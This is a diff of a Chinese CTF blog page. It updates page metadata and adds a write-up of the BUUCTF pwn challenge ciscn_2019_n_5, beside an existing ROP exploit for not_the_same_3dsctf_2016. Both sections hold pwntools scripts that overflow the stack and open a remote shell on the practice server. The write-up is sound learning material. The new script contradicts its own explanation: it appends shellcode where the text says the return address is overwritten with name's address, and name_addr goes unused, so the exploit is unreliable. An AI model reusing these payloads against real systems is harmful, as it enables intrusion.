@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      6.4k 字
+      6.6k 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      83
+      87
        分钟
     </span>
   
@@ -264,7 +264,7 @@
 <p>因为题主的本机是kali，所以在本机调试的时候并没有遇到问题，但是到远程就不行了</p>
 <p>可以看一下函数执行时的栈帧，此时rbp地址末尾是30，那么显然返回地址的末尾是38，这就没有和0x10对齐了，所以导致程序被crash了</p>
 <p><img src="/posts/ed20bbdc/Untitled%208.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
-<h2 id="system函数栈未对齐解决方法"><a class="markdownIt-Anchor" href="#system函数栈未对齐解决方法"></a> system函数栈未对齐解决方法</h2>
+<h3 id="system函数栈未对齐解决方法"><a class="markdownIt-Anchor" href="#system函数栈未对齐解决方法"></a> system函数栈未对齐解决方法</h3>
 <p>有两个方法</p>
 <p><strong>方法一：</strong></p>
 <p>将system入口地址+1</p>
@@ -486,6 +486,19 @@
 <p>还有一个改动是printf地址变了，变成了其实际的地址，而不是call printf，因为这样就可以人工设置一个返回地址来让printf函数返回，call的话会自动将返回地址压栈。</p>
 <p>这里就将这个返回地址设置为exit函数的地址即可。</p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221021</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># elf = ELF(&#x27;./ciscn_2019_en_2&#x27;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)<br>    <span class="hljs-comment"># gdb.attach(io)</span><br>    <span class="hljs-comment"># time.sleep(5)</span><br>    <br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25880</span>)<br><br><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x2d</span>)<br>get_secret = <span class="hljs-number">0x080489A0</span><br>printf_addr = <span class="hljs-number">0x0804F0A0</span><br>str_flag = <span class="hljs-number">0x080ECA2D</span> <br>exit_addr= <span class="hljs-number">0x0804E660</span><br>payload= junk + p32(get_secret) + p32(printf_addr) +p32(exit_addr)+ p32(str_flag) <br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>
+<h2 id="ciscn_2019_n_5"><a class="markdownIt-Anchor" href="#ciscn_2019_n_5"></a> ciscn_2019_n_5</h2>
+<p>看下文件信息，啥也没开</p>
+<p><img src="/posts/ed20bbdc/image-20221102174741262.png" srcset="/img/loading.gif" lazyload alt="image-20221102174741262"></p>
+<p>再看下代码，gets函数存在栈溢出，可以直接用shellcode了</p>
+<p><img src="/posts/ed20bbdc/image-20221102174830535.png" srcset="/img/loading.gif" lazyload alt="image-20221102174830535"></p>
+<p>要注意的一点是，gets函数只有一个参数，第二个参数可以忽略，这题我一开始以为是读入数据到name后再把name里的内容拷贝到text，后来发现不行。</p>
+<p>搜了下gets，发现第二个参数会被直接忽略了。依旧还是从终端读入数据到text里</p>
+<p>所以需要send两次。</p>
+<p>所以在终端读入两次</p>
+<p>第一次在name中传入构造的shellcode</p>
+<p>第二次将返回地址覆盖成name的地址，以便ret到这里执行shellcode。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221102</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># elf = ELF(&#x27;./ciscn_2019_en_2&#x27;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./ciscn_2019_n_5&#x27;</span>)<br>    <br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27122</span>)<br><br><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)<br>shellcode = asm(shellcraft.sh())<br>name_addr = <span class="hljs-number">0x0601080</span><br>io.sendlineafter(<span class="hljs-string">&quot;tell me your name\n&quot;</span>,shellcode)<br>payload = junk + shellcode<br>io.sendlineafter(<span class="hljs-string">&quot;What do you want to say to me?\n&quot;</span>,payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>
 
             </div>
             <hr>
@@ -523,6 +536,12 @@
                 <div class="post-prevnext">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/posts/abb3a5ed/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Pwn学习之栈溢出</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
